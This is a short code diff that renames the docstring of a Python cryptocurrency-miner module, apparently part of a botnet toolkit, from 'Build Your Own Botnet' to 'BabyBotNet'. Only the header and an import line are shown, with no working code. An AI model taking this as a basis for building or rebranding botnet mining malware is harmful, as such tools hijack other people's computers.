@@ -1,5 +1,5 @@
 #!/usr/bin/python
-"Cryptocurrency Miner (Build Your Own Botnet)"
+"Cryptocurrency Miner (BabyBotNet)"
 
 # standard library
 import os
